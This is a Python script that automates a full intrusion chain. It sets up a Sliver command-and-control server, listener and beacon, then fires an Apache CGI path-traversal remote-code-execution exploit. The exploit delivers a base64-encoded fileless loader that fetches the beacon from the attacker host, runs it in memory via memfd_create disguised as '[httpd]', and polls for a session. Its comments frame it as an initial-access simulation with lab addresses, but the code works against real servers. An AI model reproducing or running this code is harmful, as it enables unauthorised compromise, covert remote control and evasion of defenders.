import socket
import time
import base64
from urllib.parse import urlparse
import subprocess
import sys
import os

def is_port_open(port):
    """Check if a local port is currently in use/open on 127.0.0.1."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(1)
        try:
            s.connect(("127.0.0.1", port))
            return True
        except Exception:
            return False

def ensure_sliver_daemon():
    """Verify that the sliver-server daemon is active on port 31337.
    If not active, starts the daemon in the background.
    """
    if not is_port_open(31337):
        print("[*] Sliver daemon is not active. Starting sliver-server daemon...")
        subprocess.Popen(
            ["sliver-server", "daemon"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True
        )
        # Give the daemon a few seconds to unpack assets and bind to 31337
        print("[*] Waiting 12 seconds for Sliver daemon to initialize...")
        time.sleep(12)
    else:
        print("[+] Sliver daemon is active.")

def ensure_sliver_listener():
    """Verify that the HTTP C2 listener on port 8080 is active.
    If not active, starts the listener via sliver-client.
    """
    cmd = ["sh", "-c", "echo 'jobs' > /tmp/list_jobs.rc && echo 'exit' >> /tmp/list_jobs.rc && sliver-client --rc /tmp/list_jobs.rc"]
    try:
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if "8080" not in res.stdout:
            print("[*] Sliver HTTP listener on port 8080 not active. Starting listener...")
            start_cmd = ["sh", "-c", "echo 'http -l 8080' > /tmp/start_listener.rc && echo 'exit' >> /tmp/start_listener.rc && sliver-client --rc /tmp/start_listener.rc"]
            subprocess.run(start_cmd, capture_output=True, text=True, timeout=10)
            print("[+] Sliver HTTP listener on port 8080 started.")
        else:
            print("[+] Sliver HTTP listener on port 8080 is active.")
    except Exception as e:
        print(f"[-] Error checking/starting Sliver listener: {e}")

def ensure_beacon_compiled(kali_ip):
    """Verify that the target Sliver beacon is compiled and exists at /tmp/beacon.
    If not found, triggers a background garble compilation via sliver-client.
    """
    if not os.path.exists("/tmp/beacon"):
        print(f"[*] Sliver beacon not found at /tmp/beacon. Compiling beacon targeting {kali_ip}:8080...")
        rc_content = f"generate --http {kali_ip}:8080 --os linux --arch amd64 --save /tmp/beacon\nexit\n"
        rc_path = "/tmp/compile_beacon.rc"
        with open(rc_path, "w") as f:
            f.write(rc_content)
        
        cmd = ["sliver-client", "--rc", rc_path]
        try:
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
            if "saved to /tmp/beacon" in res.stdout or os.path.exists("/tmp/beacon"):
                print("[+] Sliver beacon successfully compiled and saved to /tmp/beacon.")
            else:
                print(f"[-] Error compiling beacon: {res.stdout}")
                sys.exit(1)
        except subprocess.TimeoutExpired:
            print("[-] Timeout: Sliver compilation took longer than 90 seconds.")
            sys.exit(1)
    else:
        print("[+] Sliver beacon exists at /tmp/beacon.")

def ensure_file_server():
    """Verify that the Python HTTP web server on port 8000 is active.
    If not active, starts it in /tmp to serve the compiled beacon.
    """
    if not is_port_open(8000):
        print("[*] Python delivery web server on port 8000 is not active. Starting server...")
        subprocess.Popen(
            ["python3", "-m", "http.server", "8000"],
            cwd="/tmp",
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True
        )
        time.sleep(2)
        print("[+] Python delivery web server started on port 8000.")
    else:
        print("[+] Python delivery web server is active on port 8000.")

def build_payload(kali_ip, file_port):
    """Generate the Base64-encoded Python loader payload.
    This loader runs entirely in-memory using the memfd_create system call.
    It forks into the background, executes the C2 beacon via its memory file
    descriptor (/proc/self/fd/N) masquerading as '[httpd]', and terminates the
    CGI parent process immediately to keep the HTTP request fast and non-blocking.
    """
    loader_code = f"""import urllib.request, ctypes, os, sys
try:
    url = "http://{kali_ip}:{file_port}/beacon"
    req = urllib.request.Request(url, headers={{'User-Agent': 'Mozilla/5.0'}})
    with urllib.request.urlopen(req) as r:
        data = r.read()
    libc = ctypes.CDLL(None)
    # sys_memfd_create(const char *name, unsigned int flags)
    # syscall 319 on x86_64, MFD_CLOEXEC = 1
    fd = libc.syscall(319, b'httpd_cache', 1)
    if fd >= 0:
        os.write(fd, data)
        if os.fork() == 0:
            os.execve(f"/proc/self/fd/{{fd}}", ["[httpd]"], os.environ)
        else:
            print("Content-Type: text/plain\\n")
            print("OK")
            sys.exit(0)
except Exception as e:
    sys.exit(1)
"""
    # Base64 encode the loader script
    b64_bytes = base64.b64encode(loader_code.encode('utf-8'))
    return b64_bytes.decode('utf-8')

def fire_exploit(target_url, kali_ip, file_port=8000):
    """Send the Apache RCE exploit containing the fileless Python loader payload."""
    parsed = urlparse(target_url)
    host = parsed.hostname
    port = parsed.port or 80

    b64_payload = build_payload(kali_ip, file_port)
    # The CGI execution payload
    payload = f"echo {b64_payload} | base64 -d | python3"
    path = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"

    request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(payload)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{payload}"
    )

    print(f"[*] Sending fileless C2 exploit to {host}:{port}{path}")

    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((host, port))
        s.sendall(request.encode())
        response = s.recv(4096).decode('utf-8', errors='ignore')
        if "200 OK" in response or "OK" in response:
            print("[+] Target executed the payload successfully (HTTP 200).")
        else:
            print(f"[-] Exploit response: {response.splitlines()[0] if response else 'No response'}")
    except Exception as e:
        print(f"[-] Error sending exploit: {e}")
    finally:
        if s is not None:
            s.close()

def check_sliver_session():
    """Run sliver-client to see if any sessions checked in."""
    cmd = ["sh", "-c", "echo 'sessions' > /tmp/list_sess.rc && echo 'exit' >> /tmp/list_sess.rc && sliver-client --rc /tmp/list_sess.rc"]
    try:
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        return res.stdout
    except Exception as e:
        print(f"[-] Error checking Sliver sessions: {e}")
        return ""

def deploy_fileless_c2(target_ip, kali_ip, file_port=8000):
    """Orchestrate the entire initial access simulation."""
    target_url = f"http://{target_ip}"
    
    # 0. Check and satisfy all C2 server prerequisites
    print("[*] Checking C2 orchestration prerequisites...")
    ensure_sliver_daemon()
    ensure_sliver_listener()
    ensure_beacon_compiled(kali_ip)
    ensure_file_server()
    print("[+] All C2 prerequisites are satisfied.")
    
    # 1. Fire the exploit
    fire_exploit(target_url, kali_ip, file_port)
    
    # 2. Wait and poll for the session in Sliver
    print("[*] Waiting for Sliver C2 session check-in (polling every 5s)...")
    for attempt in range(1, 13):
        time.sleep(5)
        output = check_sliver_session()
        # Look for any active sessions in Sliver's output
        if "linux" in output.lower() or "active" in output.lower():
            lines = output.splitlines()
            session_lines = [l for l in lines if "http" in l.lower() or "linux" in l.lower()]
            if session_lines:
                print(f"[+] Success! Active C2 session detected in Sliver:")
                for sl in session_lines:
                    print(f"    {sl}")
                return True
        print(f"[*] Attempt {attempt}/12: No active C2 session yet...")
        
    print("[-] Timeout: Sliver session failed to establish.")
    return False

if __name__ == "__main__":
    target = "10.10.0.3"
    kali = "10.10.0.2"
    if len(sys.argv) > 1:
        target = sys.argv[1]
    if len(sys.argv) > 2:
        kali = sys.argv[2]
        
    deploy_fileless_c2(target, kali)
